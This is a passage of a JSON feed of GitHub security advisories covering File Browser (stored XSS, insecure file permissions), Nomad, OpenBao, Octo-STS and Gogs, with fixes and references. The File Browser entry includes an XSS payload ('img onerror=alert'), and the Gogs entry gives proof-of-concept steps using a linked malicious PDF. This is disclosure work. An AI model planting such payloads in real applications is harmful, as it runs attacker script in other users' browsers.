            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>The Markdown preview function of File Browser v2.32.0 is vulnerable to <em>Stored Cross-Site-Scripting (XSS)</em>. Any JavaScript code that is part of a Markdown file uploaded by a user will be executed by the browser</p>\n<h2 id=\"impact\">Impact</h2>\n<p>A user can upload a malicious Markdown file to the application which can contain arbitrary HTML code. If another user within the same scope clicks on that file, a rendered preview is opened. JavaScript code that has been included will be executed.</p>\n<p> Malicious actions that are possible include:</p>\n<ul>\n<li>Obtaining a user's session token</li>\n<li>Elevating the attacker's privileges, if the victim is an administrator (e.g., gaining command execution rights)</li>\n</ul>\n<h2 id=\"vulnerability-description\">Vulnerability Description</h2>\n<p>Most Markdown parsers accept arbitrary HTML in a document and try rendering it accordingly. For instance, if one creates a file called <code>xss.md</code> with the following content:</p>\n<pre><code class=\"language-markdown\"># Hallo\n\n&lt;b&gt;foo&lt;/b&gt;\n\n&lt;img src=\"xx\" onerror=alert(9)&gt;\n&lt;i&gt;bar&lt;/i&gt;\n</code></pre>\n<p>Bold and italic text will be rendered. Also, the renderer used in File Browser will try to display the image and execute the code in the <code>onerror</code> event handler.</p>\n<h2 id=\"proof-of-concept\">Proof of Concept</h2>\n<p>The screenshot shows that the code from the file mentioned above has actually been executed in the victim's browser:</p>\n<p><img alt=\"JavaScript code being executed in the Markdown Preview\" src=\"https://github.com/user-attachments/assets/3a3b9920-fbd8-433f-a016-ea77f5f68851\"></p>\n<h2 id=\"recommended-countermeasures\">Recommended Countermeasures</h2>\n<p>The most thorough fix would be to reconfigure the application's Markdown parser to ignore all HTML elements and only render rich text which is part of the Markdown specification. If HTML rendering is considered to be a required feature, an HTML sanitizer like DOMPurify should be used, preferably in conjunction with a <em>Content Security Policy</em> (CSP).</p>\n<h2 id=\"timeline\">Timeline</h2>\n<ul>\n<li><code>2025-03-25</code> Identified the vulnerability in version 2.32.0</li>\n<li><code>2025-04-11</code> Contacted the project</li>\n<li><code>2025-04-18</code> Vulnerability disclosed to the project</li>\n<li><code>2025-06-25</code> Uploaded advisories to the project's GitHub repository</li>\n<li><code>2025-06-26</code> CVE ID assigned by GitHub</li>\n<li><code>2025-06-26</code> Fix released with version 2.33.7</li>\n</ul>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://github.com/cure53/DOMPurify\">DOMPurify</a></li>\n</ul>\n<h2 id=\"credits\">Credits</h2>\n<ul>\n<li>Mathias Tausig (<a href=\"https://www.sba-research.org/\">SBA Research</a>)</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/filebrowser/filebrowser/security/advisories/GHSA-4wx8-5gm2-2j97\">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-4wx8-5gm2-2j97</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-52902\">https://nvd.nist.gov/vuln/detail/CVE-2025-52902</a></li>\n<li><a href=\"https://github.com/filebrowser/filebrowser/commit/f19943a42e8e092e811dffbe9f4623dac36f1f0d\">https://github.com/filebrowser/filebrowser/commit/f19943a42e8e092e811dffbe9f4623dac36f1f0d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4wx8-5gm2-2j97\">https://github.com/advisories/GHSA-4wx8-5gm2-2j97</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4wx8-5gm2-2j97",
            "title": "[github.com/filebrowser/filebrowser] filebrowser allows Stored Cross-Site Scripting through the Markdown preview function",
            "date_modified": "2025-06-27T15:02:19.000Z",
            "date_published": "2025-06-27T15:01:15.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4wx8-5gm2-2j97"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>The Markdown preview function of File Browser v2.32.0 is vulnerable to <em>Stored Cross-Site-Scripting (XSS)</em>. Any JavaScript code that is part of a Markdown file uploaded by a user will be executed by the browser</p>\n<h2 id=\"impact\">Impact</h2>\n<p>A user can upload a malicious Markdown file to the application which can contain arbitrary HTML code. If another user within the same scope clicks on that file, a rendered preview is opened. JavaScript code that has been included will be executed.</p>\n<p> Malicious actions that are possible include:</p>\n<ul>\n<li>Obtaining a user's session token</li>\n<li>Elevating the attacker's privileges, if the victim is an administrator (e.g., gaining command execution rights)</li>\n</ul>\n<h2 id=\"vulnerability-description\">Vulnerability Description</h2>\n<p>Most Markdown parsers accept arbitrary HTML in a document and try rendering it accordingly. For instance, if one creates a file called <code>xss.md</code> with the following content:</p>\n<pre><code class=\"language-markdown\"># Hallo\n\n&lt;b&gt;foo&lt;/b&gt;\n\n&lt;img src=\"xx\" onerror=alert(9)&gt;\n&lt;i&gt;bar&lt;/i&gt;\n</code></pre>\n<p>Bold and italic text will be rendered. Also, the renderer used in File Browser will try to display the image and execute the code in the <code>onerror</code> event handler.</p>\n<h2 id=\"proof-of-concept\">Proof of Concept</h2>\n<p>The screenshot shows that the code from the file mentioned above has actually been executed in the victim's browser:</p>\n<p><img alt=\"JavaScript code being executed in the Markdown Preview\" src=\"https://github.com/user-attachments/assets/3a3b9920-fbd8-433f-a016-ea77f5f68851\"></p>\n<h2 id=\"recommended-countermeasures\">Recommended Countermeasures</h2>\n<p>The most thorough fix would be to reconfigure the application's Markdown parser to ignore all HTML elements and only render rich text which is part of the Markdown specification. If HTML rendering is considered to be a required feature, an HTML sanitizer like DOMPurify should be used, preferably in conjunction with a <em>Content Security Policy</em> (CSP).</p>\n<h2 id=\"timeline\">Timeline</h2>\n<ul>\n<li><code>2025-03-25</code> Identified the vulnerability in version 2.32.0</li>\n<li><code>2025-04-11</code> Contacted the project</li>\n<li><code>2025-04-18</code> Vulnerability disclosed to the project</li>\n<li><code>2025-06-25</code> Uploaded advisories to the project's GitHub repository</li>\n<li><code>2025-06-26</code> CVE ID assigned by GitHub</li>\n<li><code>2025-06-26</code> Fix released with version 2.33.7</li>\n</ul>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://github.com/cure53/DOMPurify\">DOMPurify</a></li>\n</ul>\n<h2 id=\"credits\">Credits</h2>\n<ul>\n<li>Mathias Tausig (<a href=\"https://www.sba-research.org/\">SBA Research</a>)</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/filebrowser/filebrowser/security/advisories/GHSA-4wx8-5gm2-2j97\">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-4wx8-5gm2-2j97</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-52902\">https://nvd.nist.gov/vuln/detail/CVE-2025-52902</a></li>\n<li><a href=\"https://github.com/filebrowser/filebrowser/commit/f19943a42e8e092e811dffbe9f4623dac36f1f0d\">https://github.com/filebrowser/filebrowser/commit/f19943a42e8e092e811dffbe9f4623dac36f1f0d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4wx8-5gm2-2j97\">https://github.com/advisories/GHSA-4wx8-5gm2-2j97</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4wx8-5gm2-2j97",
            "title": "[github.com/filebrowser/filebrowser/v2] filebrowser allows Stored Cross-Site Scripting through the Markdown preview function",
            "date_modified": "2025-06-27T15:02:19.000Z",
            "date_published": "2025-06-27T15:01:15.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4wx8-5gm2-2j97"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>The file access permissions for files uploaded to or created from File Browser are never explicitly set by the application.\nThe same is true for the database used by File Browser. On standard servers where the <em>umask</em> configuration has not been hardened before, this makes all the stated files readable by any operating system account.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>The default permissions for new files on a standard Linux system are <code>0644</code>, making them world-readable.\nThat means that at least the following parties have full read access to all files managed by the Filebrowser from all <em>scopes</em>, as well as its database (including the password hashes stored in there):</p>\n<ul>\n<li>All OS accounts on the server</li>\n<li>All other applications running on the same server</li>\n<li>Any Filebrowser user with <em>Command Execution</em> privileges having access to a command that allows reading a file's content</li>\n</ul>\n<h2 id=\"vulnerability-description\">Vulnerability Description</h2>\n<p>On a Linux system, the file access permissions of new files are designated by the system wide <em>umask</em> setting, unless they are configured manually.\nMost distributions set this value to <code>022</code> by default which gives every account on the system read permissions on the file.</p>\n<pre><code class=\"language-bash\">$ umask\n022\n$ touch foo\n$ ls -l foo\n-rw-r--r-- 1 sba sba 0 31. Mär 15:08 foo\n</code></pre>\n<h2 id=\"proof-of-concept\">Proof of Concept</h2>\n<p>Upload or create a file in the Filebrowser GUI and list the directory contents from a shell:</p>\n<pre><code class=\"language-bash\">$ ls -l /srv/filebrowser/testdir\ntotal 12\n-rw-r--r-- 1 sba sba 7703 Mar 25 16:07 dummy1.pdf\n-rw-r--r-- 1 sba sba    3 Mar 25 15:46 testfile.txt\n</code></pre>\n<p>The same can be validated for Docker based deployments within the container:</p>\n<pre><code class=\"language-bash\">$ docker exec -it e0f075082a2c ls /srv/testdir -l\ntotal 12\n-rw-r--r--    1 1000     1000          7703 Mar 25 15:07 dummy1.pdf\n-rw-r--r--    1 1000     1000             3 Mar 25 14:46 testfile.txt\n</code></pre>\n<p>Furthermore, the database used by the Filebrowser application is readable by any account:</p>\n<pre><code class=\"language-bash\">$ ls -l /srv/filebrowser/filebrowser.db \n-rw-rw-r-- 1 sba sba 65536 Mar 25 09:58 /srv/filebrowser/filebrowser.db\n</code></pre>\n<h2 id=\"recommended-countermeasures\">Recommended Countermeasures</h2>\n<p>Since the system's <em>umask</em> configuration cannot be controlled by the Filebrowser, the application needs to set the permissions of all new files manually upon creation.\nNo permissions should be given to the <em>other</em> category.</p>\n<p>Implementing this won't fix the permissions for active instances after an update, so site administrators will need to fix the permissions manually:</p>\n<pre><code class=\"language-bash\">$ chmod o-rwx -R /srv/filebrowser/datadir\n</code></pre>\n<h2 id=\"timeline\">Timeline</h2>\n<ul>\n<li><code>2025-03-25</code> Identified the vulnerability in version 2.32.0</li>\n<li><code>2025-04-11</code> Contacted the project</li>\n<li><code>2025-04-18</code> Vulnerability disclosed to the project</li>\n<li><code>2025-06-25</code> Uploaded advisories to the project's GitHub repository</li>\n<li><code>2025-06-26</code> CVE ID assigned by GitHub</li>\n<li><code>2025-06-26</code> Fix released with version 2.33.7</li>\n</ul>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://cwe.mitre.org/data/definitions/276.html\">CWE-276: Incorrect Default Permissions</a></li>\n<li><a href=\"https://www.cyberciti.biz/tips/understanding-linux-unix-umask-value-usage.html\">What is Umask and How To Setup Default umask Under Linux?</a></li>\n</ul>\n<h2 id=\"credits\">Credits</h2>\n<ul>\n<li>Mathias Tausig (<a href=\"https://www.sba-research.org/\">SBA Research</a>)</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/filebrowser/filebrowser/security/advisories/GHSA-jj2r-455p-5gvf\">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-jj2r-455p-5gvf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-52900\">https://nvd.nist.gov/vuln/detail/CVE-2025-52900</a></li>\n<li><a href=\"https://github.com/filebrowser/filebrowser/commit/ca86f916216620365c0f81629c0934ce02574d76\">https://github.com/filebrowser/filebrowser/commit/ca86f916216620365c0f81629c0934ce02574d76</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jj2r-455p-5gvf\">https://github.com/advisories/GHSA-jj2r-455p-5gvf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jj2r-455p-5gvf",
            "title": "[github.com/filebrowser/filebrowser] filebrowser Sets Insecure File Permissions",
            "date_modified": "2025-06-27T14:55:08.000Z",
            "date_published": "2025-06-27T14:55:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jj2r-455p-5gvf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>The file access permissions for files uploaded to or created from File Browser are never explicitly set by the application.\nThe same is true for the database used by File Browser. On standard servers where the <em>umask</em> configuration has not been hardened before, this makes all the stated files readable by any operating system account.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>The default permissions for new files on a standard Linux system are <code>0644</code>, making them world-readable.\nThat means that at least the following parties have full read access to all files managed by the Filebrowser from all <em>scopes</em>, as well as its database (including the password hashes stored in there):</p>\n<ul>\n<li>All OS accounts on the server</li>\n<li>All other applications running on the same server</li>\n<li>Any Filebrowser user with <em>Command Execution</em> privileges having access to a command that allows reading a file's content</li>\n</ul>\n<h2 id=\"vulnerability-description\">Vulnerability Description</h2>\n<p>On a Linux system, the file access permissions of new files are designated by the system wide <em>umask</em> setting, unless they are configured manually.\nMost distributions set this value to <code>022</code> by default which gives every account on the system read permissions on the file.</p>\n<pre><code class=\"language-bash\">$ umask\n022\n$ touch foo\n$ ls -l foo\n-rw-r--r-- 1 sba sba 0 31. Mär 15:08 foo\n</code></pre>\n<h2 id=\"proof-of-concept\">Proof of Concept</h2>\n<p>Upload or create a file in the Filebrowser GUI and list the directory contents from a shell:</p>\n<pre><code class=\"language-bash\">$ ls -l /srv/filebrowser/testdir\ntotal 12\n-rw-r--r-- 1 sba sba 7703 Mar 25 16:07 dummy1.pdf\n-rw-r--r-- 1 sba sba    3 Mar 25 15:46 testfile.txt\n</code></pre>\n<p>The same can be validated for Docker based deployments within the container:</p>\n<pre><code class=\"language-bash\">$ docker exec -it e0f075082a2c ls /srv/testdir -l\ntotal 12\n-rw-r--r--    1 1000     1000          7703 Mar 25 15:07 dummy1.pdf\n-rw-r--r--    1 1000     1000             3 Mar 25 14:46 testfile.txt\n</code></pre>\n<p>Furthermore, the database used by the Filebrowser application is readable by any account:</p>\n<pre><code class=\"language-bash\">$ ls -l /srv/filebrowser/filebrowser.db \n-rw-rw-r-- 1 sba sba 65536 Mar 25 09:58 /srv/filebrowser/filebrowser.db\n</code></pre>\n<h2 id=\"recommended-countermeasures\">Recommended Countermeasures</h2>\n<p>Since the system's <em>umask</em> configuration cannot be controlled by the Filebrowser, the application needs to set the permissions of all new files manually upon creation.\nNo permissions should be given to the <em>other</em> category.</p>\n<p>Implementing this won't fix the permissions for active instances after an update, so site administrators will need to fix the permissions manually:</p>\n<pre><code class=\"language-bash\">$ chmod o-rwx -R /srv/filebrowser/datadir\n</code></pre>\n<h2 id=\"timeline\">Timeline</h2>\n<ul>\n<li><code>2025-03-25</code> Identified the vulnerability in version 2.32.0</li>\n<li><code>2025-04-11</code> Contacted the project</li>\n<li><code>2025-04-18</code> Vulnerability disclosed to the project</li>\n<li><code>2025-06-25</code> Uploaded advisories to the project's GitHub repository</li>\n<li><code>2025-06-26</code> CVE ID assigned by GitHub</li>\n<li><code>2025-06-26</code> Fix released with version 2.33.7</li>\n</ul>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://cwe.mitre.org/data/definitions/276.html\">CWE-276: Incorrect Default Permissions</a></li>\n<li><a href=\"https://www.cyberciti.biz/tips/understanding-linux-unix-umask-value-usage.html\">What is Umask and How To Setup Default umask Under Linux?</a></li>\n</ul>\n<h2 id=\"credits\">Credits</h2>\n<ul>\n<li>Mathias Tausig (<a href=\"https://www.sba-research.org/\">SBA Research</a>)</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/filebrowser/filebrowser/security/advisories/GHSA-jj2r-455p-5gvf\">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-jj2r-455p-5gvf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-52900\">https://nvd.nist.gov/vuln/detail/CVE-2025-52900</a></li>\n<li><a href=\"https://github.com/filebrowser/filebrowser/commit/ca86f916216620365c0f81629c0934ce02574d76\">https://github.com/filebrowser/filebrowser/commit/ca86f916216620365c0f81629c0934ce02574d76</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jj2r-455p-5gvf\">https://github.com/advisories/GHSA-jj2r-455p-5gvf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jj2r-455p-5gvf",
            "title": "[github.com/filebrowser/filebrowser/v2] filebrowser Sets Insecure File Permissions",
            "date_modified": "2025-06-27T14:55:08.000Z",
            "date_published": "2025-06-27T14:55:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jj2r-455p-5gvf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Nomad Community and Nomad Enterprise (“Nomad”) prefix-based ACL policy lookup can lead to incorrect rule application and shadowing. This vulnerability, identified as CVE-2025-4922, is fixed in Nomad Community Edition 1.10.2 and Nomad Enterprise 1.10.2, 1.9.10, and 1.8.14.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-4922\">https://nvd.nist.gov/vuln/detail/CVE-2025-4922</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2025-12-nomad-vulnerable-to-incorrect-acl-policy-lookup-attached-to-a-job/75396\">https://discuss.hashicorp.com/t/hcsec-2025-12-nomad-vulnerable-to-incorrect-acl-policy-lookup-attached-to-a-job/75396</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rx97-6c62-55mf\">https://github.com/advisories/GHSA-rx97-6c62-55mf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rx97-6c62-55mf",
            "title": "[github.com/hashicorp/nomad] Hashicorp Nomad Incorrect Privilege Assignment vulnerability",
            "date_modified": "2025-06-27T14:15:01.000Z",
            "date_published": "2025-06-11T15:30:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rx97-6c62-55mf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>OpenBao and HashiCorp Vault allowed an attacker to perform unauthenticated, unaudited cancellation of root rekey and recovery rekey operations, effecting a denial of service.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>In OpenBao v2.2.2 and later, manually setting the configuration option <code>disable_unauthed_rekey_endpoints=true</code> allows an operator to deny these rarely-used endpoints on global listeners.</p>\n<p>In a future OpenBao release <a href=\"https://openbao.org/docs/deprecation/\">communicated on our website</a>, we will set this to <code>true</code> for all users and provide an authenticated alternative.</p>\n<p>This vulnerability has been disclosed to HashiCorp; see their website for more information. </p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If an active proxy or load balancer sits in front of OpenBao, an operator can deny requests to these endpoints from unauthorized IP ranges.</p>\n<h3 id=\"references\">References</h3>\n<p>See the <a href=\"https://openbao.org/docs/deprecation/unauthed-rekey/\">deprecation notice</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openbao/openbao/security/advisories/GHSA-prpj-rchp-9j5h\">https://github.com/openbao/openbao/security/advisories/GHSA-prpj-rchp-9j5h</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-52894\">https://nvd.nist.gov/vuln/detail/CVE-2025-52894</a></li>\n<li><a href=\"https://github.com/openbao/openbao/commit/fe75468822a22a88318c6079425357a02ae5b77b\">https://github.com/openbao/openbao/commit/fe75468822a22a88318c6079425357a02ae5b77b</a></li>\n<li><a href=\"https://github.com/openbao/openbao/releases/tag/v2.3.1\">https://github.com/openbao/openbao/releases/tag/v2.3.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-prpj-rchp-9j5h\">https://github.com/advisories/GHSA-prpj-rchp-9j5h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-prpj-rchp-9j5h",
            "title": "[github.com/openbao/openbao/api/v2] OpenBao allows cancellation of root rekey and recovery rekey operations without authentication",
            "date_modified": "2025-06-26T21:29:06.000Z",
            "date_published": "2025-06-26T21:29:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-prpj-rchp-9j5h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>OpenBao before v2.3.0 and HashiCorp Vault as of the current v1.19.5 may leak sensitive information in logs when processing malformed data. This is separate from the earlier HCSEC-2025-09 / CVE-2025-4166. </p>\n<h3 id=\"patches\">Patches</h3>\n<p>This issue has been fixed in OpenBao v2.3.0 and later.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Like with HCSEC-2025-09, there is no known workaround except to ensure properly formatted requests from all clients.</p>\n<h3 id=\"remediation\">Remediation</h3>\n<p>Users with the capability to search through server and audit logs for any possible exposed secrets can refer to the following snippets to aid in searching:</p>\n<p>Audit Log</p>\n<pre><code>... \"error\":\"error converting input for field \\\"password\\\": expected type 'string', got unconvertible type 'map[string]interface {}', value: '&lt;sensitive data&gt;'\" ...\n</code></pre>\n<p>Server Log</p>\n<pre><code>error converting input for field \"password\": expected type 'string', got unconvertible type 'map[string]interface {}', value: '&lt;sensitive data&gt;'\n</code></pre>\n<p>If any matches are found, rotating the affected secret is advised.</p>\n<h3 id=\"references\">References</h3>\n<p>See also: <a href=\"https://discuss.hashicorp.com/t/hcsec-2025-09-vault-may-expose-sensitive-information-in-error-logs-when-processing-malformed-data-with-the-kv-v2-plugin/74717\">https://discuss.hashicorp.com/t/hcsec-2025-09-vault-may-expose-sensitive-information-in-error-logs-when-processing-malformed-data-with-the-kv-v2-plugin/74717</a></p>\n<p>See also: <a href=\"https://github.com/go-viper/mapstructure/releases/tag/v2.3.0\">https://github.com/go-viper/mapstructure/releases/tag/v2.3.0</a></p>\n<p>See also: <a href=\"https://github.com/go-viper/mapstructure/pull/105\">https://github.com/go-viper/mapstructure/pull/105</a> -&gt; <a href=\"https://github.com/go-viper/mapstructure/commit/ed3f92181528ff776a0324107b8b55026e93766a\">https://github.com/go-viper/mapstructure/commit/ed3f92181528ff776a0324107b8b55026e93766a</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openbao/openbao/security/advisories/GHSA-8f5r-8cmq-7fmq\">https://github.com/openbao/openbao/security/advisories/GHSA-8f5r-8cmq-7fmq</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-52893\">https://nvd.nist.gov/vuln/detail/CVE-2025-52893</a></li>\n<li><a href=\"https://github.com/go-viper/mapstructure/commit/ed3f92181528ff776a0324107b8b55026e93766a\">https://github.com/go-viper/mapstructure/commit/ed3f92181528ff776a0324107b8b55026e93766a</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2025-09-vault-may-expose-sensitive-information-in-error-logs-when-processing-malformed-data-with-the-kv-v2-plugin/74717\">https://discuss.hashicorp.com/t/hcsec-2025-09-vault-may-expose-sensitive-information-in-error-logs-when-processing-malformed-data-with-the-kv-v2-plugin/74717</a></li>\n<li><a href=\"https://github.com/go-viper/mapstructure/releases/tag/v2.3.0\">https://github.com/go-viper/mapstructure/releases/tag/v2.3.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8f5r-8cmq-7fmq\">https://github.com/advisories/GHSA-8f5r-8cmq-7fmq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8f5r-8cmq-7fmq",
            "title": "[github.com/openbao/openbao/sdk/v2/framework] OpenBao Inserts Sensitive Information into Log File when processing malformed data",
            "date_modified": "2025-06-26T21:25:02.000Z",
            "date_published": "2025-06-26T21:25:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8f5r-8cmq-7fmq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>Octo-STS versions before v0.5.3 are vulnerable to unauthenticated SSRF by abusing fields in OpenID Connect tokens. Malicious tokens were shown to trigger internal network requests which could reflect error logs with sensitive information. </p>\n<p>Please upgrade to v0.5.3 to resolve this issue. This version includes patch sets to <a href=\"https://github.com/octo-sts/app/commit/b3976e39bd8c8c217c0670747d34a4499043da92\">sanitize input</a> and <a href=\"https://github.com/octo-sts/app/commit/0f177fde54f9318e33f0bba6abaea9463a7c3afd\">redact logging</a>.</p>\n<p>Many thanks to @vicevirus for reporting this issue and for assisting with remediation review.</p>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://github.com/octo-sts/app/security/advisories/GHSA-h3qp-hwvr-9xcq\">https://github.com/octo-sts/app/security/advisories/GHSA-h3qp-hwvr-9xcq</a></li>\n<li><a href=\"https://github.com/octo-sts/app/commit/b3976e39bd8c8c217c0670747d34a4499043da92\">https://github.com/octo-sts/app/commit/b3976e39bd8c8c217c0670747d34a4499043da92</a></li>\n<li><a href=\"https://github.com/octo-sts/app/commit/0f177fde54f9318e33f0bba6abaea9463a7c3afd\">https://github.com/octo-sts/app/commit/0f177fde54f9318e33f0bba6abaea9463a7c3afd</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/octo-sts/app/security/advisories/GHSA-h3qp-hwvr-9xcq\">https://github.com/octo-sts/app/security/advisories/GHSA-h3qp-hwvr-9xcq</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-52477\">https://nvd.nist.gov/vuln/detail/CVE-2025-52477</a></li>\n<li><a href=\"https://github.com/octo-sts/app/commit/0f177fde54f9318e33f0bba6abaea9463a7c3afd\">https://github.com/octo-sts/app/commit/0f177fde54f9318e33f0bba6abaea9463a7c3afd</a></li>\n<li><a href=\"https://github.com/octo-sts/app/commit/b3976e39bd8c8c217c0670747d34a4499043da92\">https://github.com/octo-sts/app/commit/b3976e39bd8c8c217c0670747d34a4499043da92</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h3qp-hwvr-9xcq\">https://github.com/advisories/GHSA-h3qp-hwvr-9xcq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h3qp-hwvr-9xcq",
            "title": "[github.com/octo-sts/app] Octo STS Unauthenticated SSRF by abusing fields in OpenID Connect tokens",
            "date_modified": "2025-06-26T18:53:57.000Z",
            "date_published": "2025-06-26T18:53:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h3qp-hwvr-9xcq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A stored XSS is present in Gogs which allows client-side Javascript code execution.</p>\n<h3 id=\"details\">Details</h3>\n<p>Gogs Version:</p>\n<pre><code>docker images\nREPOSITORY   TAG       IMAGE ID       CREATED        SIZE\ngogs/gogs    latest    fe92583bc4fe   10 hours ago   99.3MB\n</code></pre>\n<p>Application version: <code>0.14.0+dev</code></p>\n<p>Local setup using:</p>\n<pre><code class=\"language-bash\"># Pull image from Docker Hub.\ndocker pull gogs/gogs\n\n# Create local directory for volume.\nsudo mkdir -p /var/gogs\n\n# Use `docker run` for the first time.\ndocker run --name=gogs -p 10022:22 -p 10880:3000 -v /var/gogs:/data gogs/gogs\n</code></pre>\n<p>The vulnerability is caused by the usage of a vulnerable and outdated component: <code>pdfjs-1.4.20</code> under public/plugins/.<br>Read more about this vulnerability at <a href=\"https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/\">codeanlabs - CVE-2024-4367</a>.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Upload the Proof of Concept file hosted at <a href=\"https://codeanlabs.com/wp-content/uploads/2024/05/poc_generalized_CVE-2024-4367.pdf\">https://codeanlabs.com/wp-content/uploads/2024/05/poc_generalized_CVE-2024-4367.pdf</a> in a repository.</li>\n<li>Click on the file to be previewed.</li>\n</ol>\n<p><img alt=\"poc\" src=\"https://github.com/user-attachments/assets/5af1303e-8751-49c8-af2e-d0631dd18957\"></p>\n<h3 id=\"credits\">Credits</h3>\n<p>Edoardo Ottavianelli</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/gogs/gogs/security/advisories/GHSA-xh32-cx6c-cp4v\">https://github.com/gogs/gogs/security/advisories/GHSA-xh32-cx6c-cp4v</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-47943\">https://nvd.nist.gov/vuln/detail/CVE-2025-47943</a></li>\n<li><a href=\"https://github.com/gogs/gogs/commit/110117b2e5e5baa4809c819bec701e929d2d8d40\">https://github.com/gogs/gogs/commit/110117b2e5e5baa4809c819bec701e929d2d8d40</a></li>\n<li><a href=\"https://github.com/gogs/gogs/releases/tag/v0.13.3\">https://github.com/gogs/gogs/releases/tag/v0.13.3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xh32-cx6c-cp4v\">https://github.com/advisories/GHSA-xh32-cx6c-cp4v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xh32-cx6c-cp4v",
            "title": "[github.com/gogs/gogs] Gogs XSS allowed by stored call in PDF renderer",
            "date_modified": "2025-06-26T16:54:03.000Z",
            "date_published": "2025-06-26T16:54:01.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xh32-cx6c-cp4v"
            },
            "tags": [
                "severity"
            ]
        },
        {
